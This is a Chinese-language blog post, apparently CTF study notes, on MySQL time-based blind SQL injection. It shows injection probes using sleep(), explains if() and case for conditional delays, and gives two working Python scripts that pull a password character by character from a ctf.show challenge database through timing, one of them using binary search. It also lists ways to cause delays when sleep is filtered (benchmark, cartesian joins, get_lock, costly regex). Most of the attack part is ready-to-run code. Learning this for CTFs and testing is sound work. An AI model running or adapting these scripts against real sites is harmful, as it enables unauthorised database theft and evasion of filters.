---
layout: post
title: MySQL延时盲注
date: 2023-08-01 10:00:00
description: MySQL延时盲注
tags: MySQL
categories: Web安全
---

# MySQL延时盲注

### 一般使用Sleep()函数

```sql
1' and sleep(10) --+
#判断有无延时
```

#### if()函数：

if()函数有三个参数，其用法为if(a,b,c)

第一个参数a：判断语句，返回结果为真假

第二个参数b：如果前面的判断返回为真，则执行b

第三个参数c：如果前面的判断返回为假，则执行c

#### case()函数

```sql
select case 'a' when 'a' then 1 else 0 end
#返回1
```

```sql
select case when 'a'='a' then 1 else 0 end
#返回1
```

***

来个脚本：

```python
import requests
from time import time

url='http://e64bf4ac-c4b7-488d-98fb-7d2d7e644d48.challenge.ctf.show/api/v5.php?id='
urld='&page=1&limit=10'
flag=''
select='select database()'
select="select group_concat(password) from ctfshow_user5 where username='flag'"

if __name__ =="__main__":
    for i in range(1,100):
        for ascii in range(32,128):
            id=f"1' union select 1,if(ascii(right(({select}),{i}))={ascii},sleep(2),1) -- "
            start_time=time()
            # print(start_time)
            r=requests.get(url=url+id+urld).text
            end_time=time()
            # print(end_time-start_time)
            if(end_time-start_time>1.9):
                flag=chr(ascii)+flag
                print(flag)
                break
            if(ascii==127):
                exit(0)

```

还有个用二分的更快一点的脚本：

```python
import requests
from time import time
 
url='http://e64bf4ac-c4b7-488d-98fb-7d2d7e644d48.challenge.ctf.show/api/v5.php?id='
urld='&page=1&limit=10'

flag=''

select="select group_concat(password) from ctfshow_user5 where username='flag'"
# select='select database()'

for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag=chr(j)+flag
            print(flag)
            break
        payload=f"?id=1' union select 1,if(ascii(right(({select}),{i}))<{j},sleep(2),1) -- "
        start_time=time()
        # print(start_time)
        r=requests.get(url=url+payload).text
        end_time=time()
        if (end_time-start_time>1.9):
            max=j
        else:
            min=j
```

## 过滤了sleep时：

***

### 1.benchmark：

```sql
select benchmark(1e7,sha1('gehaotian'))#约要1.5秒
select benchmark(1000000,md5('gehaotian'))#约要1.5秒
```

#### 2.笛卡尔积

```sql
select count(*) from information_schema.columns A,information_schema.columns B;
#尽量用超时判断

```

#### 3.get\_lock:

使用场景有限制，需要提供长连接。

需先在一个session中锁定：

```sql
select get_lock('haptian',1);

```

在另一个session中get\_lock:

```sql
select get_lock('haotian',5);
#用时5秒
```

#### 4.正则表达式：

```sql
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');

```
